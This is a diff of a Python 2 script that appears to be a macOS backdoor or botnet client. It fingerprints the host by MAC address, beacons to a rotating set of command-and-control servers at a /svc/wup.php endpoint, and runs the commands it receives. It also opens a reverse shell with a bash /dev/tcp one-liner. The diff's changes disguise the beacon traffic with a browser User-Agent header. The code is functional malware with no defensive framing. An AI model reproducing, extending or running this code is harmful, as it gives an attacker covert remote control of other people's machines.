@@ -7,6 +7,7 @@ import urllib2
 import subprocess
 from os import path, access, R_OK
 from subprocess import Popen
+from uuid import getnode as get_mac
 
 
 import socket
@@ -34,13 +35,16 @@ while True:
 
 			original_mac = subprocess.check_output("/sbin/ifconfig en0 | grep ether | awk 'NR==1{print $2}'", shell=True)
 			original_mac =original_mac.rstrip('\n')
+			#original_mac=str(get_mac())
 			name=name+"_"+original_mac
 			print original_mac
 			#httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
 			#httpServ.connect()
 			#httpServ.request('GET', "/svc/wup.php?pc="+name)
 			#response = httpServ.getresponse()
-			response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name)
+			request = urllib2.Request("http://"+site+"/svc/wup.php?pc="+name, headers={'User-Agent': 'Mozilla/5.0'})
+			response = urllib2.urlopen(request)
+			#response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name)
 			sresponse = response.read()
 			#if response.status == httplib.OK:
 			if sresponse!= '':
@@ -65,7 +69,9 @@ while True:
 					site=site3
 				elif site == site3:
 					site=site1
-				response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name)
+				request = urllib2.Request("http://"+site+"/svc/wup.php?pc="+name, headers={'User-Agent': 'Mozilla/5.0'})
+				response = urllib2.urlopen(request)
+				#response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name)
 				sresponse = response.read()
 				print "Output from HTML request"
 				#sresponse = response.read()
@@ -84,7 +90,9 @@ while True:
 				#os.system(scmd)
 				print scmd
 				p = Popen(scmd,shell='false')
-				response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name+"&exec=0")
+				request = urllib2.Request("http://"+site+"/svc/wup.php?pc="+name+"&exec=0", headers={'User-Agent': 'Mozilla/5.0'})
+				response = urllib2.urlopen(request)
+				#response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name+"&exec=0")
 				#httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
 				#httpServ.connect()
 				#httpServ.request('GET', "/svc/wup.php?pc="+name+"&exec=0")
@@ -95,7 +103,9 @@ while True:
 				p = Popen("bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1",shell='false')
 				#sret=subprocess.check_output("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1", shell=True)
 				#os.system("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1")
-				response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name+"&kill=1")
+				request = urllib2.Request("http://"+site+"/svc/wup.php?pc="+name+"&kill=1", headers={'User-Agent': 'Mozilla/5.0'})
+				response = urllib2.urlopen(request)
+				#response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name+"&kill=1")
 				#httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
 				#httpServ.connect()
 				#httpServ.request('GET', "/svc/wup.php?pc="+name+"&kill=1")
